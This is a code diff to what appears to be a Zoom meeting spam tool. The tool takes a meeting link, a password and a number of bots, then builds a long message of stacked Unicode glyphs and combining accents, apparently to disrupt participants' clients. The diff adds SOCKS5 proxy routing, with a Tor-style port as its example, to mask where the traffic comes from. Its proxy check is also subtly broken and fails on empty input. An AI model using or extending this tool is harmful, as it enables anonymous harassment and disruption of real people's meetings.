@@ -15,6 +15,9 @@ from constants import url_re
 from exceptions import WrongPasswordError
 from zoom import Zoom
 
+import socket
+import socks
+
 logging.disable(logging.CRITICAL)
 logger.add("file_{time}.log", enqueue=True)
 
@@ -68,6 +71,13 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
 
 
 async def main():
+    proxy = input(_("Enter SOCKS5 proxy server (if you need one, ex. '127.0.0.1:9050'): ")).split(":")
+
+    if len(proxy) > 0:
+        host, port = proxy
+        socks.set_default_proxy(socks.SOCKS5, host, int(port))
+        socket.socket = socks.socksocket
+
     url = input(_("Enter zoom meeting link: ")).strip()
     password = input(
         _("Enter a meeting password, if there is any and it's not specified in the url (or press Enter): ")
@@ -77,7 +87,7 @@ async def main():
 
     bot_count = int(input(_("Enter the amount of bots: ")))
     message = "𒐫𪚥𒈙á́́́́́́́́́́́́́́́́́́́́́́́́́́́́́"
-    message = message * int(1024 / len(message))
+    message *= int(1024 / len(message))
 
     url_parsed = re.findall(url_re, url)
     if len(url_parsed) == 0:
